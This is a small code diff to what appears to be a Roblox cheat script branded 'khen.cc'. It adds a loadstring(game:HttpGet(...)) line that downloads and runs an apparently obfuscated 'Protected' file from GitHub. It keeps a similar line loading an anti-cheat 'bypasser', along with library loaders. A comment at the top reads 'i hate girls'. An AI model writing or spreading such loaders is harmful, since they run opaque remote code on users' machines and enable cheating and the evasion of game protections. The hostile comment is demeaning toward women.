@@ -1,6 +1,6 @@
 -- i hate girls 
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aa8283/i/refs/heads/main/Protected_2547730226887233.txt"))()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/khenn791/script-khen/refs/heads/main/larplarpbypasser.txt"))()
 
@@ -184,7 +184,7 @@ local ThemeManager = loadstring(game:HttpGet(repo .. 'nini/ThemeManager.lua'))()
 local SaveManager = loadstring(game:HttpGet(repo .. 'nini/SaveManager.lua'))()
 
 
-Library:Notify('khen.cc')
+Library:Notify('khen.cc and last upd')
 wait(1)
 
 
